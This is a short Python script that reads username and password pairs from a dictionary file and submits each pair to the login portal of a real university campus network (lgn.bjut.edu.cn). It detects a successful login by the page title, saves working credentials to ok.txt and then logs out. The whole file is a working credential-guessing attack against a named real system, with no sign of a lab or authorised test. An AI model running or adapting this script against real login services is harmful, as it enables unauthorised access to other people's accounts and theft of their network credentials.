# coding=utf-8
# import io
import urllib.parse
import urllib.request
from html.parser import HTMLParser


def is_success(html_raw):
    class HtmlPar(HTMLParser):
        flg_title = False
        flg_success = False

        def handle_starttag(self, tag, attrs):
            if tag == 'title':
                HtmlPar.flg_title = True

        def handle_endtag(self, tag):
            if tag == 'title':
                HtmlPar.flg_title = False

        def handle_data(self, data):
            if HtmlPar.flg_title and data == "登录成功窗":
                HtmlPar.flg_success = True

    html_par = HtmlPar()
    html_bin = html_raw.decode("GB2312")
    html_par.feed(html_bin)
    if html_par.flg_success:
        return True
    else:
        return False


# open dict
f_dic = open("dic.txt")
f_out = open("ok.txt", "w")
u_name = f_dic.readline().strip('\n')
u_pass = f_dic.readline().strip('\n')
while u_name != "" and u_pass != "":
    # try the pair
    print("Trying", u_name, "with password", u_pass, end='')
    html_values = {
        'DDDDD': u_name,
        'upass': u_pass,
        'v46s': '1',
        '0MKKey': ''
    }
    html_data = urllib.parse.urlencode(html_values).encode(encoding='UTF8')
    html_url = "https://lgn.bjut.edu.cn/"
    html_req = urllib.request.Request(html_url, html_data)
    html_res = urllib.request.urlopen(html_req, timeout=3)
    html_raw = html_res.read()

    # parse html
    if is_success(html_raw):
        # login successfully
        f_out.write(u_name + ',' + u_pass + '\n')
        print("\tSuccess!")
        # logout
        html_url = "https://lgn.bjut.edu.cn/F.html"
        html_req = urllib.request.Request(html_url, None)
        try:
            urllib.request.urlopen(html_req, timeout=1)
        except:
            print("No need to logout or logout err.")
    else:
        print("\tFailed.")

    u_name = f_dic.readline().strip('\n')
    u_pass = f_dic.readline().strip('\n')

f_dic.close()
f_out.close()
